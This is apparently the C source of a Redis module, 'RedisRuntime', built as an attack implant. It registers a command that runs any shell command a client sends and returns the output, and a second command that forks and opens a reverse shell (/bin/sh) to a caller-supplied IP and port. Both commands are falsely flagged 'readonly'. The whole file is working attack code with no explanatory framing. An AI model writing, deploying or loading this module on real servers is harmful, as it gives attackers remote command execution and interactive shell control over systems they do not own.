#include "redismodule.h"

#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
	if (argc == 2) {
			size_t cmd_len;
			size_t size = 1024;
			char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
			char p_cmd[1024] = {0};
			setvbuf(stdout,NULL,_IONBF,0);
			setvbuf(stderr,NULL,_IONBF,0);

			strcpy(p_cmd, cmd);
			strcat(p_cmd, " 2>&1");

			FILE *fp = popen(p_cmd, "r");
			char *buf, *output;
			buf = (char *)RedisModule_Alloc(size);
			output = (char *)RedisModule_Alloc(size);      
			memset(buf,0,1024);
			memset(output,0,1024);
	
			char * tmp=output;
			while (fgets(buf, 1024, fp)!=NULL) {  
					if (strlen(buf) + strlen(output) >= size) {
							size += 1024;
							tmp = RedisModule_Realloc(output, size); 
					}
					if (tmp!=NULL){
						output = tmp;
						strcat(output, buf);
					}
			}
			RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
			RedisModule_ReplyWithString(ctx, ret);
			
			RedisModule_FreeString(ctx,ret);
			RedisModule_Free(buf);
			RedisModule_Free(output);
			pclose(fp);
			return REDISMODULE_OK;
	} else {
			return RedisModule_WrongArity(ctx);
	}
	
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
	if (argc == 3) {
		size_t cmd_len;
		char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
		char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
		int port = atoi(port_s);
        int pid;
		char * succ= "+OK";
		pid = fork();
		if (pid || pid == -1){
            RedisModuleString *ret = RedisModule_CreateString(ctx, succ, strlen(succ));
            RedisModule_ReplyWithString(ctx, ret);
		    RedisModule_FreeString(ctx,ret);
			return REDISMODULE_OK;
		}
		
		struct sockaddr_in sa;
		sa.sin_family = AF_INET;
		sa.sin_addr.s_addr = inet_addr(ip);
		sa.sin_port = htons(port);

		int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sock == -1) {
			exit(EXIT_FAILURE);
		}
		if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
			close(sock);
			exit(EXIT_FAILURE);
		}

		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);
		execve("/bin/sh", NULL, NULL);

		return REDISMODULE_OK;
	}
	return RedisModule_WrongArity(ctx);
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"RedisRuntime",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "RedisRuntime.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
	  if (RedisModule_CreateCommand(ctx, "RedisRuntime.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}


